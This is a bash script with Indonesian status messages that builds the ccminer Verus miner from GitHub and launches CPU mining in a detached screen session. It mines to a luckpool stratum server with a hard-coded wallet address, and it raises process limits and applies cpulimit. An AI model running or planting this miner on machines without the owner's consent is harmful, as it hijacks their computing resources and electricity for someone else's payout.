#!/bin/bash


echo "🔹 Mengupdate dan menginstal dependencies..."
sudo apt update && sudo apt upgrade -y
sudo apt install cpulimit -y
sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y

echo "🔹 Mengunduh CCMiner..."
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
cd ccminer || { echo "Gagal masuk ke direktori ccminer!"; exit 1; }

echo "🔹 Memberikan izin eksekusi pada script build..."
chmod +x build.sh configure.sh autogen.sh

echo "🔹 Memulai proses build CCMiner..."
./build.sh

cd ..

echo "🔹 Memulai  miner..."
screen -dmS Miner ./ccminer/ccminer -a verus -o stratum+tcp://na.luckpool.net:3956#xnsub -u REzE9WtQM5vfTU5ji5tLRWMfmYZmRevsXN -p x -t 16  --cpu-priority=5

echo "🔹 Menjalankan CPU limit .."
ulimit -u unlimited
ulimit -n 100000

pkill -f cpulimit
cpulimit -e ccminer -l 1450 -b 

echo "✅ Mining dimulai! Gunakan 'screen -r Miner1' atau 'screen -ls' untuk melihat log."
